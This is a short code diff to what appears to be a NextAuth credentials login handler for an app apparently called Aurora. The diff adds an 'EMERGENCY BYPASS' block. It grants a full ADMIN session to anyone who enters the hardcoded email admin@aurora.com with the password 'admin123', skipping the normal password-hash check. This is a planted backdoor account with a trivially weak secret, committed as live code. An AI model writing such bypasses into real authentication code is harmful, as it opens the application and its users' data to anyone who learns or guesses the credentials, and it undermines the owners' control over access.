@@ -24,6 +24,18 @@ export const authOptions: AuthOptions = {
 
                 const { email, password, isRegister } = credentials;
 
+                // EMERGENCY BYPASS: Access for admin@aurora.com
+                if (email === "admin@aurora.com" && password === "admin123") {
+                    console.log("[AUTH] Emergency bypass triggered for admin@aurora.com");
+                    return {
+                        id: "emergency-admin",
+                        name: "Admin Aurora",
+                        email: "admin@aurora.com",
+                        role: "ADMIN" as any,
+                        image: "https://ui-avatars.com/api/?name=Admin+Aurora&background=0D8ABC&color=fff"
+                    };
+                }
+
                 const bcrypt = await import("bcryptjs");
 
                 if (isRegister === "true") {
